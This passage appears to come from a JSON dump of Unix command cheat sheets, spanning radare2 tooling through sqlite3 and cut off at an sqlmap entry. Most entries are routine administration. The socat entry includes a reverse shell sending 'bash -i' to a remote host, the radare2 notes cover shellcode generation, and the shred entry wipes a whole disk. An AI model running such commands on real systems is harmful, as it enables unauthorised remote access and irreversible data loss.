\"/bin/sh\" /usr/lib/libc.so.6\n\n# ragg2 - Shellcode generator, C/opcode compiler\n\n\tP: Generate De Bruijn patterns\n    \t\tragg2 -P 300 -r\n\n\t-a arch: Configure architecture\n\n\t-b bits: Specify architecture bits (32/64)\n\n\t-i shellcode: Specify shellcode to generate\n\n\t-e encoder: Specify encoder\n\n\t+ ragg2-cc: Generate shellcode from c\n\n\t+ Generate a x86, 32 bits exec shellcode\n    \t\tragg2 -a x86 -b 32 -i exec\n\n# rabin2 - Executable analysis: symbols, imports, strings\n\n\t-I: Executable information\n\n\t-C: Returns classes. Useful to list Java Classes\n\n\t-l: Dynamic linked libraries\n\n\t-s: Symbols\n\n\t-z: Strings\n\n# rarun2 - Launcher to run programs with different environments, args, stdin, permissions, fds\n\n\tr2 -b 32 -d rarun2 program=pwn1 arg1=$(ragg2 -P 300 -r) : runs pwn1 with a De Bruijn Pattern as first argument, inside radare2's debugger, and force 32 bits\n\tr2 -d rarun2 program=/bin/ls stdin=$(python exploit.py) : runs /bin/ls with the output of exploit.py directed to stdin\n\n# ESIL emulation\n\n\t1) aei: Initialize ESIL VM\n\t\n\t2) aeim: Assign ESIL stack\n\t\taeim 0xffffd000 0x1000 stack\n\t\n\t3) aeip: Program counter to current seek\n\n\t4) e io.cache=true: Enable caching read/write of virtual memory (Important if self modifying code)\n\n\t5) aes: Single stepping in emulation mode\n\n\t+ Toggle IL representation via O in Visual Mode\n\n# ESIL Linear emulation\n\n\tFind all references to curr. address using linear esil emulation on all imports.\n\t\t\n\t\t/re$$@@ sym.imp.*\n\n# ESIL IL Representation\n\n\top \tesil\n\t------------\n\tmov \t=\n\tmul \t*\n\tdiv \t/\n\tand \t&\n\tneg\t!\n\tread \t[]\n\tif \t?{\n\tadd\t+\n\tsub\t-\n\txor \t^\n\tor\t|\n\tcmp\t==\n\twrite\t=[]\n\t\n\t+ prefix is %\n\t+ carry from bit x -> %cx\n\t+ borrow from bit x -> %bx\n\t+ zero-flag -> %z\n\t+ parity of dst -> %p\n\t+ sign-flag -> %s\n\t+ overflow-flag -> %o\n\n\t+ BREAK - Stop parsing and emulate next instruction\n\t+ LOOP - restart emulation of instruction\n\t+ GOTO n - jump to n\n\t+ TODO - stop emulation and eprintf(\"TDOD %s\", ins)\n\n\tx86\t\t\tESIL\n\t------------------------------------------------------\n\tmov eax, ebx\t\tebx,eax,=\n\tjz 0xaabbccdd\t\tzf,?{,0xaabbccdd,eip,=,}\n\tcmp ecx,edx\t\tedx,ecx,==,%z,zf,=,%b32,cf,=,%p,pf,=,%s,sf,=\n\tpush ebp\t\t4,esp,-=ebp,esp,=[4]\n\n\t+ ESIL Doc\n\t\thttps://github.com/radare/radare2book/blob/master/esil.md\n\t\n# r2pipe commands\n\n\t+ Invoke r2pipe script via r2 cmdline\n\t\t\n\t\t[0x00000000]> #!pipe node script.js\n\t\t[0x00000000]> #!pipe python script.py\n\n\t+ Good collection:\n\t\thttps://radare.org/get/r2pipe-nn2015.pdf\n\t\thttps://github.com/jpenalbae/r2-scripts\n# Parsing ELF\n\t\n\t!!! open with r2 -nn \n\n\t+ Parse 9 program headers (elf_phdr) from curr. seek plus offset 0x40 with temporary block size 0x200 in less mode (~..)\n\n\t\t[0x00000000]> pf 9? (elf_phdr)phdr @ $$+0x40!0x200~..\n\t\n# pf Templates\n\t\n\t+ Generate templates for structs/enums with td command\n\n\t\t\"td enum elf_class {ELFCLASSNONE=0, ELFCLASS32=1, ELFCLASS64=2};\"\n\n\thttps://github.com/Maijin/r2-pf-templates/\n\n\t+ Cast data @ <addr> to <type> and print it\t\t\n\t\t\n\t\ttp <type>  = <address>\n\n# r2scapy\n\n\tr2 -i r2scapy.py dump.bin\n\t\t[0x00000000]> scapy DNS 0x81de3c 48\n\t\tDNS(aa=1L, qr=1L, an=DNSRR(rclass=32769, ttl=120, rrname='flashair.local.', rdata='192.168.0.1', type=1), ad=0L, nscount=0, qdcount=1, ns=None, tc=0L, rd=1L, arcount=0, ar=None, opcode=0L, ra=0L, cd=0L, z=0L, rcode=0L, id=0, ancount=1, qd=DNSQR(qclass=32769, qtype=255, qname='flashair.local.'))\n\t\n\t+ generate packets with scapy\n\t\t>>> from scapy.all import *\n\t\t>>> sr1(IP(dst=\"8.8.8.8\")/UDP(dport=53)/DNS(rd=1,qd=DNSQR(qname=\"www.thepacketgeek.com\")),verbose=0)\n\n# r2m2 -Miasm  Intermediate Representation Plugin\n\t\n\t+ Assemble and disassemble MIPS32 using rasm2\n\n\t\tr2m2$ export R2M2_ARCH=mips32l; rasm2 -a r2m2 'addiu a0, a1, 2' |rasm2 -a r2m2 -d -\n\t\tADDIU      A0, A1, 0x2\n\n\t+ Disassemble random MSP430 instructions in r2\n\n\t\tr2m2$ R2M2_ARCH=msp430 r2 -a r2m2 -qc 'woR; pd 5' -\n            \t\t0x00000000      07fa           and.w      R10, R7\n            \t\t0x00000002      47ad           dadd.b     R13, R7\n            \t\t0x00000004      f05e0778       add.b      @R14+, 0x7807(PC)\n            \t\t0x00000008      f46d81ed       addc.b     @R13+, 0xED81(R4)\n            \t\t0x0000000c      3fdc           bis.w      @R12+, R15\n\t+ Assemble MIPS32 using rasm2 and display the call graph using r2\n\n\t\tr2m2$ R2M2_ARCH=mips32b rasm2 -a r2m2 'j 0x4; nop' -B > j_nop.bin\n\n\t\tr2m2$ R2M2_ARCH=mips32b r2 -a r2m2 -qc 'pd 2' j_nop.bin\n        \t\t,=< 0x00000000      0c000001       JAL        0x4\n       \t\t\t`-> 0x00000004      00000000       NOP\n\n# bin carving with r2\n\n\t+ Open raw dump\n\t\t\n\t\tr2 -n dump.bin\n\t\n\t+ Searching for  magic\n\t\t\n\t\t[0x00000000]> / \\x7fELF\n\t\tSearching 4 bytes from 0x00000000 to 0x0000002d: 7f 45 4c 46\n\t\t0x00001340 hit0_0\n\t\t0x00001744 hit0_1\n\t\t...\n\n\t+ Dump 1M with at several hits\n\n\t\t[0x00000000]> b 1M\n\t\t[0x00000000]> wt @@ hit0*\n\n\t+ Automate it\n\t\t\n\t\t$ for a in dump.* ; do\n\t\tsz=`rabin2 -Z $a`     # get RBin.filesize\n\t\tr2 -wnqc\"r $sz\" $a  # resize file\n\t\tdone\n\n\thttp://radare.today/posts/carving-bins/\n\n# r4ge - symbolic execution\n\t+ https://github.com/gast04/r4ge\n\n\tUsage: https://asciinema.org/a/155856\n\n# r2wiki -Macro for using wiki in commandline\n\t\n\t+ https://github.com/securisec/r2wiki\n\n\t$wiki \"query string\"\n\t\n"
        },
        {
          "name": "rcs",
          "type": "blob",
          "size": 0.625,
          "content": "# To initially check-in a file (leaving file active in filesystem):\nci -u <filename>\n\n# To check out with lock:\nco -l <filename>\n\n# To check in and unlock (leaving file active in filesystem):\nci -u <filename>\n\n# To display version x.y of a file:\nco -px.y <filename>\n\n# To undo to version x.y (overwrites file active in filesystem with the specified revision):\nco -rx.y <filename>\n\n# To diff file active in filesystem and last revision:\nrcsdiff <filename>\n\n# To diff versions x.y and x.z:\nrcsdiff -rx.y -rx.z <filename>\n\n# To view log of check-ins:\nrlog <filename>\n\n# To break an RCS lock held by another person on a file:\nrcs -u <filename>\n"
        },
        {
          "name": "readline",
          "type": "blob",
          "size": 2.9521484375,
          "content": "    Moving around\nCtrl-b      Move the cursor             one character               ⇦ to the left\nCtrl-f      Move the cursor             one character               ⇨ to the right\nAlt-b       Move the cursor             one word                    ⇦ to the left\nAlt-f       Move the cursor             one word                    ⇨ to the right\nCtrl-a      Move the cursor                                         ⇤ to the start of the line\nCtrl-e      Move the cursor                                         ⇥ to the end of the line\nCtrl-x-x    Move the cursor                                         ⇤⇥ to the start, and to the end again\n\n    Cut, copy and paste\nBackspace   Delete                      the character               ⇦ to the left of the cursor\nDEL\nCtrl-d      Delete                      the character               underneath the cursor\nCtrl-u      Delete                      everything                  ⇤ from the cursor back to the line start\nCtrl-k      Delete                      everything                  ⇥ from the cursor to the end of the line\nAlt-d       Delete                      word                        ⇨ until before the next word boundary\nCtrl-w      Delete                      word                        ⇦ until after the previous word boundary\nCtrl-y      Yank/Paste                  prev. killed text           at the cursor position\nAlt-y       Yank/Paste                  prev. prev. killed text     at the cursor position\n\n    History\nCtrl-p      Move in history             one line                    ⇧ before this line\nCtrl-n      Move in history             one line                    ⇩ after this line\nAlt->       Move in history             all the lines               ⇩ to the line currently being entered\nCtrl-r      Incrementally search        the line history            ⇧ backwardly\nCtrl-s      Incrementally search        the line history            ⇩ forwardly\nCtrl-J      End an incremental search\nCtrl-G      Abort an incremental search and restore the original line\nAlt-Ctrl-y  Yank/Paste                  arg. 1 of prev. cmnd        at the cursor position\nAlt-.\nAlt-_       Yank/Paste                  last arg of prev. cmnd      at the cursor position\n\n    Undo\nCtrl-_\nCtrl-x\nCtrl-u      Undo the last editing command; you can undo all the way back to an empty line\nAlt-r       Undo all changes made to this line\nCtrl-l      Clear the screen, reprinting the current line at the top\nCtrl-l      Clear the screen, reprinting the current line at the top\n\n    Completion\nTAB         Auto-complete a name\nAlt-/       Auto-complete a name (without smart completion)\nAlt-?       List the possible completions of the preceeding text\nAlt-*       Insert all possible completions of the preceeding text\n\n    Transpose\nCtrl-t      Transpose/drag              char. before the cursor     ↷ over the character at the cursor\nAlt-t       Transpose/drag              word before the cursor      ↷ over the word at/after the cursor\n"
        },
        {
          "name": "reboot",
          "type": "blob",
          "size": 0.03515625,
          "content": "# reboot at 22:00\nshutdown -r 22:00\n"
        },
        {
          "name": "rename",
          "type": "blob",
          "size": 0.1884765625,
          "content": "# To lowercase all files and folders in current directory:\nrename 'y/A-Z/a-z/' *\n\n# To replace 'sometext' with 'replacedby' in all files in current directory:\nrename 's/sometext/replacedby/' *\n"
        },
        {
          "name": "rm",
          "type": "blob",
          "size": 0.1767578125,
          "content": "# To remove all files and subdirs in <dir>:\nrm -rf <dir>\n\n# To ignore non-existent files:\nrm -f <dir>\n\n# To remove a file with this inode:\nfind /tmp/ -inum 6666 -exec rm -i '{}' \\;\n"
        },
        {
          "name": "rmdir",
          "type": "blob",
          "size": 0.318359375,
          "content": "# Command syntax:\nrmdir [option] directory_name \n\n# Outputs a message that the directory is being removed:\nrmdir -v directory_name\n\n# adding the -p option deletes the child directory then its parent directory:\nrmdir-p directory_name\n\n# Shows the syntax of the command:\nrmdir --help\n\n# Get the command version:\nrmdir --version\n"
        },
        {
          "name": "route",
          "type": "blob",
          "size": 1.6533203125,
          "content": "---\ntags: [ networking ]\n---\n# To display routing table IP addresses instead of host names:\nroute -n\n\n# To add a default gateway:\nroute add default gateway 192.168.0.1\n\n# To add the normal loopback entry, using netmask 255.0.0.0 and associated with\n# the \"lo\" device (assuming this device was previously set up correctly with\n# ifconfig(8)):\nroute add -net 127.0.0.0 netmask 255.0.0.0 dev lo\n\n# To add a route to the local network 192.56.76.x via \"eth0\".  The word \"dev\" can be omitted here:\nroute add -net 192.56.76.0 netmask 255.255.255.0 dev eth0\n\n# To delete the current default route, which is labeled \"default\" or 0.0.0.0 in the destination field of the current routing table:\nroute del default\n\n# To add a default  route (which will be used if no other route matches).  All\n# packets using this route will be gatewayed through \"mango-gw\". The device\n# which will actually be used for that route depends on how we can reach\n# \"mango-gw\" - the static route to \"mango-gw\" will have to be set up before:\nroute add default gw mango-gw\n\n# To add the route to the \"ipx4\" host via the SLIP interface (assuming that \"ipx4\" is the SLIP host):\nroute add ipx4 sl0\n\n# To add the net \"192.57.66.x\" to be gateway through the former route to the SLIP interface:\nroute add -net 192.57.66.0 netmask 255.255.255.0 gw ipx4\n\n# To install a rejecting route for the private network \"10.x.x.x.\":\nroute add -net 10.0.0.0 netmask 255.0.0.0 reject\n\n# This is an obscure one documented so people know how to do it. This sets all\n# of the class D (multicast) IP routes to go via \"eth0\". This is the correct\n# normal configuration line with a multicasting kernel:\nroute add -net 224.0.0.0 netmask 240.0.0.0 dev eth0\n"
        },
        {
          "name": "rpm",
          "type": "blob",
          "size": 0.6611328125,
          "content": "---\ntags: [ packaging ]\n---\n# To install a package:\nrpm -ivh <rpm>\n\n# To update a package:\nrpm -Uv <rpm>\n\n# To remove a package:\nrpm -e <package>\n\n# To remove a package, but not its dependencies\nrpm -e --nodeps <package>\n\n# To find what package installs a file:\nrpm -qf <file>\n\n# To find what files are installed by a package:\nrpm -ql <package>\nrpm -qpl <rpm>\n\n# To find what packages require a package or file:\nrpm -q --whatrequires <package>\nrpm -q --whatrequires <file>\n\n# To list all installed packages:\nrpm -qa\n\n# To find a packages's dependencies:\nrpm -i --test <package>\n\n# To display checksum against a source:\nrpm -K <package>\n\n# To verify a package:\nrpm -V <package>\n"
        },
        {
          "name": "rpm2cpio",
          "type": "blob",
          "size": 0.1513671875,
          "content": "---\ntags: [ packaging ]\n---\n# To list contents of an RPM:\nrpm2cpio <rpm-file> | cpio -vt\n\n# To extract contents of an RPM:\nrpm2cpio <rpm-file> | cpio -vid\n"
        },
        {
          "name": "rss2email",
          "type": "blob",
          "size": 0.28125,
          "content": "# To list all feeds:\nr2e list\n\n# To convert RSS entries to email:\nr2e run\n\n# To add a new feed:\nr2e add <feed-address>\n\n# To add a new feed with new email address:\nr2e add <feed-address> [new-email-address]\n\n# To delete a feed :\nr2e delete <number-of-feed-in-list>\n\n# To get help:\nr2e -h\n"
        },
        {
          "name": "rsync",
          "type": "blob",
          "size": 1.3466796875,
          "content": "# To copy files from remote to local, maintaining file properties and sym-links\n# (-a), zipping for faster transfer (-z), verbose (-v):\nrsync -avz host:file1 :file1 /dest/\nrsync -avz /source host:/dest\n\n# To copy files using checksum (-c) rather than time to detect if the file has\n# changed. (Useful for validating backups):\nrsync -avc <src> <dest>\n\n# To copy /src/foo folder into destination:\n# This command will create /dest/foo if it does not already exist\nrsync -auv /src/foo /dest\n\n# To copy contents of /src/foo into destination:\n# This command will not create /foo_bak/foo folder\nrsync -auv /src/foo/ /foo_bak\n\n# To copy file from local to remote over ssh with non standard port 1234 to\n# destination folder in remoteuser's home directory:\nrsync -avz -e \"ssh -p1234\" <source> <username>@<host>:<dest>\n\n# Use the specified authentication key, instead of typing a password:\n# (The key can be generated by ssh-keygen, and the public key should be placed\n# in remote's authorized_keys, e.g. using ssh-copy-id)\nrsync -avz -e \"ssh -i ~/.ssh/id_rsa\" <src> <dest>\n\n# Log into remote as a user, but promote to root, to access privileged files:\nrsync -avz --rsync-path=\"sudo rsync\" user@<src> <dest>\n\n# Rsync only symlinks and preserve them as symlinks (dont follow them):\nfind /path/to/files -type l -print | \\\n  rsync -av --files-from=- /path/to/files user@targethost:/dest_path\n"
        },
        {
          "name": "ruby",
          "type": "blob",
          "size": 0.4228515625,
          "content": "# Ruby - Interpreted object-oriented scripting language\n# Main page: https://www.ruby-lang.org/\n# Help and documentation: https://ruby-doc.org/\n\n# To serve the current directory:\nruby -run -e httpd . -p <port>\n\n# To execute a script file:\nruby <file>\n\n# To execute one line of script:\nruby -e 'command'\n\n# To check script file syntax:\nruby -c <file>\n\n# To specify $LOAD_PATH directory:\nruby -Idirectory\nruby -Ispec spec/test_spec.rb\n"
        },
        {
          "name": "salt",
          "type": "blob",
          "size": 0.7724609375,
          "content": "---\nsyntax: bash\ntags: [ salt, saltstack ]\n---\n# Show pending keys to be accepted:\nsalt-key -L\n\n# Accept all pending keys:\nsalt-key -A\n\n# Accept pending key by name:\nsalt-key -a <target>\n\n# Remove key by name:\nsalt-key -D <target>\n\n# Test minion connection:\nsalt <target> test.ping\n\n# Show active salt jobs\nsalt-run jobs.active\n\n# Kill active job\nsalt <target> saltutil.kill_job <job_id>\n\n# Copy small file (< 100kb) from master to minion\nsalt-cp <target> <source> <dest>\n\n# Copy large file from master (/srv/salt/<source>) directory to minion\nsalt <target> cp.get_file salt://<source> <destination>\n\n# Copy file from minion to master (will be stored at /var/cache/salt/master/minions/<minion_name>/files\nsalt <target> cp.push <source>\n\n# Deploy state\nsalt <target> state.apply <state_name>\n"
        },
        {
          "name": "sam2p",
          "type": "blob",
          "size": 0.060546875,
          "content": "# To concatenate all pdf files into one:\nsam2p *.pdf out.pdf\n"
        },
        {
          "name": "sar",
          "type": "blob",
          "size": 0.57421875,
          "content": "---\ntags: [ reporting ]\n---\n\n# Reports CPU utilization every 2 seconds, 5 times:\nsar -u 2 5\n\n# Report the CPU usage for a given core:\nsar -P 1 1 3\n\n# Reports the amount of memory used, amount of memory free, available cache, available buffers every 1 second, 3 times: \nsar -r 1 3\n\n# Reports statistics on swapping:\nsar -S 1 3\n\n# Reports on the file systems mounted every 2 seconds 5 times:\nsar -F 2 5\n\n# Reports on the  block devices every 1 second, 3 times:\nsar -d 1 3\n\n# Reports on the network interface, network speed, IPV4, TCPV4, ICMP traffic and errors:\nsar -n DEV 1 3 | grep -v lo\n"
        },
        {
          "name": "scd",
          "type": "blob",
          "size": 0.453125,
          "content": "# To index recursively some paths for the very first run:\nscd -ar ~/Documents/\n\n# To change to a directory path matching \"doc\":\nscd doc\n\n# To change to a path matching all of \"a\", \"b\" and \"c\":\nscd a b c\n\n# To change to a directory path that ends with \"ts\":\nscd \"ts$\"\n\n# To show selection menu and ranking of 20 most likely directories:\nscd -v\n\n# To alias current directory as \"xray\":\nscd --alias=xray\n\n# To jump to a previously defined aliased directory:\nscd xray\n"
        },
        {
          "name": "scp",
          "type": "blob",
          "size": 0.458984375,
          "content": "# To copy a file from your local machine to a remote server:\nscp <file> <user>@<host>:<dest>\n\n# To copy a file from a remote server to your local machine:\nscp <user>@<host>:<src> <dest>\n\n# To scp a file over a SOCKS proxy on localhost and port 9999 (see ssh for tunnel setup):\nscp -o \"ProxyCommand nc -x 127.0.0.1:9999 -X 4 %h %p\" <file> <user>@<host>:<dest>\n\n# To scp between two remote servers from the third machine:\nscp -3 <user>@<host1>:<src> <user>@<host2>:<dest>\n"
        },
        {
          "name": "screen",
          "type": "blob",
          "size": 0.279296875,
          "content": "# To start a new named screen session:\nscreen -S <session-name>\n\n# To detach from the current session:\nPress Ctrl+A then press d\n\n# To re-attach a detached session:\nscreen -r <session-name>\n\n# To list all screen sessions:\nscreen -ls\n\n# To quit a session:\nscreen -XS <session-name> quit\n"
        },
        {
          "name": "sed",
          "type": "blob",
          "size": 0.65234375,
          "content": "# To replace all occurrences of \"day\" with \"night\" and write to stdout:\nsed 's/day/night/g' <file>\n\n# To replace all occurrences of \"day\" with \"night\" within <file>:\nsed -i 's/day/night/g' <file>\n\n# To replace all occurrences of \"day\" with \"night\" on stdin:\necho 'It is daytime' | sed 's/day/night/g'\n\n# To remove leading spaces:\nsed -i -r 's/^\\s+//g' <file>\n\n# To remove empty lines and print results to stdout:\nsed '/^$/d' <file>\n\n# To replace newlines in multiple lines:\nsed ':a;N;$!ba;s/\\n//g' <file>\n\n# To insert a line before a matching pattern:\nsed '/Once upon a time/i\\Chapter 1'\n\n# To add a line after a matching pattern:\nsed '/happily ever after/a\\The end.'\n"
        },
        {
          "name": "selinux",
          "type": "blob",
          "size": 1.509765625,
          "content": "---\ntags: [ security ]\n---\n\n## selinux standard\n\n# To get the status of selinux\ngetenforce\n# or\nsestatus\n# or from the file\ncat /etc/selinux/config\n\n# To set the status to permissive\nsetenforce 0\n\n# To get the context of files/processes/ports/users\nls -Z\nps -Z\nss -Z\nid -Z\n\n\n## Booleans\n# To get all booleans\ngetsebool -a\n\n# To set a boolean permanently\nsetsebool foo_bar 1 -P\n\n# To get all changed booleans\nsudo cat /var/lib/selinux/targeted/active/booleans.local\n\n\n## selinux file context management\n# To set a context the complicated way\nsudo chcon -t foo_bar_t /foo/bar/baz.txt\n# the lazy way, this sets all files to the right context in the directory\nsudo restorecon -vR /foo/bar/\n\n# To create a rule with semanage for /foo and for the httpd server\nsudo semanage fcontext -a -t httpd_sys_content_t \"/foo(/.*)?\"\n# or use\nsudo semanage -a -e /var/www/html /foo\n# and run restorecon\nsudo restorecon -vR /foo\n\n\n## selinux Troubleshoot\n# First install setroubleshoot and setroubleshoot-server\nsudo dnf install setroubleshoot\n# Next, check the journalctl\nsudo journalctl -t setroubleshoot\n\n\n## selinux modules\n# To create a module, you need to set selinux in permissive mode and test the application with all its features\nsudo setenforce 0\n# then check the journalctl log\nsudo journalctl\n# and search for sealert, then run sealert\nsudo sealert -l <uuid>\n# and run the following commands from the output\ngrep foobar /var/log/audit/audit.log | audit2allow -M mypol\nsudo semodule -i mypol.pp\n\n\n## Graphical tools\nsudo dnf install policycoreutils-gui\n"
        },
        {
          "name": "sha256sum",
          "type": "blob",
          "size": 1.0751953125,
          "content": "---\ntags: [ cryptography, hash, checksum, verification ]\n---\n# To compute hash (checksum) of <file>:\nsha256sum <file>\n\n# To compute hash (checksum) from input text:\n# Enter text in keyboard and finish by ctrl-D at beginning of line\nsha256sum\nSome text\n^D\n\necho -n \"Hello World\" | sha256sum\n\n# To verify if a hash (checksum) is correct if a hash-file is provided:\n# sha256sum will go thru the files listed in <file-with-list-of-checksums>.\n# For each file it will look if it exists. If not, it will print an error.\n# If it does exist it will compute the checksum and compare it with the hash \n# provided in the <file-with-list-of-checksums>. If they match (good!) it\n# will print \"filename: OK\". \n# If they don't match (warning, you might have been hacked), it will \n# print \"filename: FAILED\".\nsha256sum --check <file-with-list-of-checksums>\n\n# Same as above (but ignore missing files):\n# This tells you if your file is an exact copy (OK) or has been \n# tampered with (FAILED) without bothering you with warnings about\n# missing files\nsha256sum --check --ignore-missing <file-with-list-of-checksums>\n\n"
        },
        {
          "name": "shred",
          "type": "blob",
          "size": 0.3818359375,
          "content": "# To shred a file (5 passes) and verbose output:\nshred -n 5 -v <file>\n\n# To shred a file (5 passes) and a final overwrite of zeroes:\nshred -n 5 -vz <file>\n\n# To do the above, and then truncate and rm the file:\nshred -n 5 -vzu <file>\n\n# To shred a partition:\nshred -n 5 -vz /dev/sda\n\n# Remember that shred may not behave as expected on journaled file systems if file data is being journaled.\n"
        },
        {
          "name": "shutdown",
          "type": "blob",
          "size": 0.1982421875,
          "content": "# To reboot the system immediately:\nshutdown -r now\n\n# To shut system down immediately:\nshutdown -h now\n\n# To reboot system after 5 minutes:\nshutdown -r +5\n\n# To cancel a scheduled shutdown:\nshutdown -c\n"
        },
        {
          "name": "slurm",
          "type": "blob",
          "size": 0.34765625,
          "content": "# To submit a new job:\nsbatch job.sh\n\n# To list all jobs for a user:\nsqueue -u <user>\n\n# To cancel a job by id or name:\nscancel <job-id>\nscancel --name <job-name>\n\n# To list all information for a job:\nscontrol show jobid -dd <job-id>\n\n# To status info for currently running job:\nsstat --format=AveCPU,AvePages,AveRSS,AveVMSize,JobID -j <job-id> --allsteps\n"
        },
        {
          "name": "smbclient",
          "type": "blob",
          "size": 0.1357421875,
          "content": "# To display public shares on the server:\nsmbclient -L <host> -U%\n\n# To connect to a share:\nsmbclient //<host>/<share> -U<user>%<password>\n"
        },
        {
          "name": "snap",
          "type": "blob",
          "size": 2.28515625,
          "content": "---\ntags: [ packaging ]\n---\n# To find <package>:\nsnap find <package>\n\n# To view detailed information about <package>:\nsnap info <package>\n\n# To view all private snaps (must be logged in):\nsnap find --private\n\n# To install the <package>:\nsudo snap install <package>\n\n# To install the <package> from the \"beta\" channel:\nsudo snap install <package> --channel=beta\n\n# To view installed snaps:\nsnap list\n\n# To list all revisions of installed snaps:\nsnap list --all\n\n# To (manually) update all snaps:\nsudo snap refresh\n\n# To (manually) update <package>:\nsudo snap refresh <package>\n\n# To update <package> to the \"beta\" channel:\nsudo snap refresh <package> --channel=beta\n\n# To revert <package> to a prior version:\nsudo snap revert <package>\n\n# To revert <package> to revision 5:\nsnap revert <package> --revision 5\n\n# To remove <package>:\nsudo snap remove <package>\n\n# To log in to snap (must first create account online):\nsudo snap login\n\n# To log out of snap:\nsnap logout\n\n# To view a transaction log summary:\nsnap changes\n\n# To view details of item 123 in the transaction log:\nsnap change 123\n\n# To watch transaction 123:\nsnap watch 123\n\n# To abort transaction 123:\nsnap abort 123\n\n# To download <package> (and its assertions) *without* installing it:\nsnap download <package>\n\n# To install the locally-downloaded `foo` snap with assertions:\nsnap ack foo.assert\nsnap install foo.snap\n\n# To install the locally-downloaded `foo` snap without assertions:\n# NB: this is dangerous, because the integrity of the snap will not be\n# verified. You should only do this to test a snap that you are currently\n# developing.\nsnap install --dangerous foo.snap\n\n# To install snap `foo` in \"dev mode\":\n# NB: this is dangerous, and bypasses the snap sandboxing mechanisms\nsnap install --devmode foo\n\n# To install snap `foo` in \"classic mode\":\n# NB: this is likewise dangerous\nsnap install --classic foo\n\n# To view available snap interfaces:\nsnap interfaces\n\n# To connect the `foo:camera` plug to the ubuntu core slot:\nsnap connect foo:camera :camera\n\n# To disconnect the `foo:camera` plug from the ubuntu core slot:\nsnap disconnect foo:camera\n\n# To disable the `foo` snap\nsnap disable foo\n\n# To enable the `foo` snap\nsnap enable foo\n\n# To set snap `foo`'s `bar` property to 10:\nsnap set foo bar=10\n\n# To read snap `foo`'s current `bar` property:\nsnap get foo bar\n"
        },
        {
          "name": "snmpwalk",
          "type": "blob",
          "size": 0.2255859375,
          "content": "# To retrieve all of the variables under system for host zeus:\nsnmpwalk -Os -c public -v 1 zeus system\n\n# To retrieve the scalar values, but omit the sysORTable for host zeus:\nsnmpwalk -Os -c public -v 1 -CE sysORTable zeus system\n"
        },
        {
          "name": "socat",
          "type": "blob",
          "size": 1.3935546875,
          "content": "---\ntags: [ networking ]\n---\n# socat connect to http-server (port 80 on 'butzel.info')\nsocat TCP4:butzel.info:80 -\n\n# connect to https-server (port 443 on 'butzel.info' with tls)\nsocat openssl:butzel.info:443 -\n\n# tcp-listener (port 3180), output as hexdump (-x) and fork for new connetions\nsocat -x tcp-listen:3180,fork -\n\n# practical examples:\n\n# complete real working http-example:  \n#  (sleep is necessary to prevent socat closing socket before data received)\n(echo -e \"GET / HTTP/1.1\\r\\nHost: butzel.info\\r\\n\\r\" && sleep 1) \\ \n| socat tcp4:butzel.info:80 -\n\n# http to httpS 'Proxy' (for an webserver without TLS-Support)\nsocat OPENSSL-LISTEN:443,reuseaddr,pf=ip4,fork,cert=server.pem,cafile=client.crt,verify=0 TCP4-CONNECT:127.0.0.1:80\n\n# port forwarding (e.g. own port 3180 to port 22(ssh) on target\nsocat TCP4-LISTEN:3180,reuseaddr,fork TCP4:butzel.info:ssh\n\n# TOR-forwarding (needs tor-daemon on port 9050 running)\nsocat tcp4-listen:8080,reuseaddr,fork socks4A:127.0.0.1:t0rhidd3ns3rvice.onion:80,socksport=9050\n\n# network (port 8266) to serial bridge (/dev/ttyUSB0 baudrate: 115200)\nsocat TCP4-LISTEN:8266,fork,reuseaddr /dev/ttyUSB0,raw,crnl,b115200\n\n# udp to tcp\nsocat -u udp-recvfrom:1234,fork tcp:localhost:4321\n\n# reverse shell:\nsocat exec:'bash -i',pty,stderr tcp:remote.butzel.info:3180\n\n# listener for above reverse shell (on remote.butzel.info):\nsocat file:`tty`,raw,echo=0 tcp-listen:3180\n# or: nc -lp 3180\n"
        },
        {
          "name": "sockstat",
          "type": "blob",
          "size": 0.10546875,
          "content": "---\ntags: [ networking ]\n---\n# To view which users/processes are listening to which ports:\nsudo sockstat -l\n"
        },
        {
          "name": "sort",
          "type": "blob",
          "size": 0.44921875,
          "content": "# To sort a file:\nsort <file>\n\n# To sort a file by keeping only unique:\nsort -u <file>\n\n# To sort a file and reverse the result:\nsort -r <file>\n\n# To sort a file randomly:\nsort -R <file>\n\n# To sort a file and store the output in another file:\nsort <inputFile> -o <outputFile>\n\n# Sort by default uses /var/tmp to store temp files but size of /var/tmp directory is limited. In order to sort huge use a directory with adequate size:\nsort -T <tempDirectory> <file>"
        },
        {
          "name": "split",
          "type": "blob",
          "size": 0.2333984375,
          "content": "# To split a large text file into smaller files of 1000 lines each:\nsplit <file> -l 1000\n\n# To split a large binary file into smaller files of 10M each:\nsplit <file> -b 10M\n\n# To consolidate split files into a single file:\ncat x* > <file>\n"
        },
        {
          "name": "sport",
          "type": "blob",
          "size": 0.7060546875,
          "content": "---\ntags: [ packaging ]\n---\n# To sync to newest slackbuild.org tree:\nsport r\n\n# to search (fuzzy) slackbuild tree for packages foo and bar:\nsport s foo bar\n\n# To operate from alternate build tree:\nSBOPATH=/path/to/tree sport s foo\n\n# to view info and readme of bar (not fuzzy):\nsport c foo BaR\n\n# To build a package:\nsport i --build-only foo\n\n# to build and install package foo and bar:\nsport i foo BaR\n\n# To build and install package from current directory:\nsport i .\n\n# To upgrade instead of install:\nINSTALLER=upgradepkg sport i foo\n\n# To build dependency list for baz:\necho \"foo bar\" >> /tmp/baz.list\n\n# To install list of packages from file:\nsport i $(< /tmp/baz.list)\n\n# To check if package is installed:\nsport k foo\n"
        },
        {
          "name": "sqlite3",
          "type": "blob",
          "size": 0.76171875,
          "content": "---\ntags: [ database ]\n---\n# To create database and launch interactive shell:\nsqlite3 <database>\n\n# To create table:\nsqlite3 <database> \"create table os(id integer primary key, name text, year integer);\"\n\n# To insert data:\nsqlite3 <database> \"insert into 'os' values(1,'linux',1991);\"\n\n# To list tables:\nsqlite3 <database> \".tables\"\n\n# To describe table:\nsqlite3 <database> \".schema 'os'\"\n\n# To view records in table:\nsqlite3 <database> \"select * from 'os';\"\n\n# To view records in table conditionally:\nsqlite3 <database> \"select * from 'os' where year='1991';\"\n\n# To view records with fuzzy matching:\nsqlite3 <database> \"select * from 'os' where year like '19%';\"\n\n# To create a table named `cities` and import a csv into it:\nsqlite3 <database> \".import /path/to/city.csv cities\"\n"
        },
        {
          "name": "sqlmap",
          "type": "blob",
          "size": 1.5029296875,
